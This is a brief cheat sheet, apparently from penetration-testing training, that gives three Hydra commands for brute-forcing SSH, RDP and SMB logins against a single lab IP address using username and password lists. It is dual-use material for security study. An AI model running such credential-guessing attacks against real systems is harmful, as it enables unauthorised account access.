#### SSH
```shell
hydra -L user.list -P password.list ssh://10.129.42.197
```
#### RDP
```shell
hydra -L user.list -P password.list rdp://10.129.42.197
```
#### SMB
```shell
hydra -L user.list -P password.list smb://10.129.42.197
```
